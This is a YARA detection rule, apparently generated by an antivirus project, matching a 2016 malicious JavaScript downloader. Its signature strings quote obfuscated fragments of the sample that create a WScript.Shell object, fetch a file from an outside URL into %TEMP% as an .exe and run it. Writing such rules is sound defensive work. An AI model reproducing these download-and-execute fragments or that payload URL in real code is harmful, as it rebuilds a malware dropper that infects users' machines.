rule sig_20160328_5b1085c909f22d25b9efd6ff7addc239 {
  meta:
    description = "datamaliciousorder - file 20160328_5b1085c909f22d25b9efd6ff7addc239.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "668d33044f98e053ddafb7da541e0b783e206186e5e46339cd9356aa82c623c0"

  strings:
    $s1  = "function Vfhqwqi() {return Prbtucuai[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Eom5h1dAj.exe\";};" fullword ascii
    $s2  = "do {WScript[Hfbpgkr](Bfyvvebl() * 11)} while (Auygfsvhhw[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Cohttu(Xwrjp, Ljxozsn){return Xwrjp - Ljxozsn;};" fullword ascii
    $s4  = "Auygfsvhhw[Xlvnsmdyuo](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s5  = "var Prbtucuai = function Vksezvpy() {return WScript[Bwnzfwa](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Hfnmoqlgvv() {return ((Dmklbupr == true) && (Dmklbupr == Rhhgkygf)) ? 1 : Pvbonyu;};" fullword ascii
    $s7  = "function Teyhmrabgz(Ecgkogrczy){Prbtucuai[\"Run\"](Ecgkogrczy, Pvbonyu, Pvbonyu);};" fullword ascii
    $s8  = "return Cohttu(Tsqfgdpdja, Arbnl);" fullword ascii
    $s9  = "function Hmolyawcbc(Wrizcfd) {var Ydjolajvr = (1, 2, 3, 4, 5, Wrizcfd); return Ydjolajvr;};" fullword ascii
    $s10 = "var Dmklbupr = false;" fullword ascii
    $s11 = "Dmklbupr = true; " fullword ascii
    $s12 = "var Rhhgkygf = false;" fullword ascii
    $s13 = "var Tehfy = false;" fullword ascii
    $s14 = "function Jmkpoo(){return Bwnzfwa;};" fullword ascii
    $s15 = "Rhhgkygf = true; " fullword ascii
    $s16 = "function Hjpunp(){return Fbveu;};" fullword ascii
    $s17 = "function Bfyvvebl(){return 22;};" fullword ascii
    $s18 = "var Fyyosw = new this[\"Date\"]();" fullword ascii
    $s19 = " while (Tkpbazj){" fullword ascii
    $s20 = "function Gzzybx()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}